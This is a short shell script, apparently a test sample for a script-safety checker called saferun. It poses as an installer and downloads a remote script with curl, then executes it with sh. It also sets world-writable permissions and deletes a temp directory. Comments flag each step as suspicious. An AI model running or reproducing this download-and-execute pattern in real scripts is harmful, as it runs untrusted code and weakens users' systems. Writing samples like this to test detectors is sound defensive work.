#!/bin/sh

# Fake install script (example for saferun)

echo "[*] Installing awesome-tool..."

# create temp dir
mkdir -p /tmp/awesome-tool
cd /tmp/awesome-tool

# download something (network usage)
echo "[*] Downloading dependencies..."
curl -s https://example.com/install.sh -o install.sh

# execute downloaded script (very suspicious)
sh install.sh

# modify permissions (questionable)
chmod 777 /tmp/awesome-tool

# write to file
echo "installed=true" > /tmp/awesome-tool/config

# simulate dangerous cleanup
echo "[*] Cleaning up..."
rm -rf /tmp/old-data

echo "[*] Done!"